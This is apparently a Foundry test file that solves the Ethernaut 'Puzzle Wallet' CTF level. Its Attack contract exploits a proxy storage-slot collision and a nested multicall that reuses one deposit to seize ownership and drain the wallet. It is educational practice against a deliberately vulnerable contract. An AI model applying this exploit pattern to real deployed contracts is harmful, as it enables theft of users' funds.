// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/24-PuzzleWallet/PuzzleWalletFactory.sol";
import "../src/Ethernaut.sol";

contract PuzzleWalletTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = vm.addr(1);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 10 ether);
    }

    function testPuzzleWalletHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        PuzzleWalletFactory factory = new PuzzleWalletFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress, eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(factory);
        // PuzzleProxy level = PuzzleProxy(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////
        
        
        Attack hack = new Attack();
        hack.attack{value: 0.002 ether}(levelAddress);


        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {

    bytes[] depositData = [abi.encodeWithSignature("deposit()")];
    bytes[] multicallData = [
        abi.encodeWithSignature("deposit()"), 
        abi.encodeWithSignature("multicall(bytes[])", depositData)];

    function attack(address target) public payable {
        PuzzleProxy(payable(target)).proposeNewAdmin(address(this));
        PuzzleWallet(target).addToWhitelist(address(this));
        PuzzleWallet(target).multicall{value: 0.001 ether}(multicallData);
        PuzzleWallet(target).execute(msg.sender, 0.002 ether, "");
        PuzzleWallet(target).setMaxBalance(uint256(uint160(address(msg.sender))));
    }
}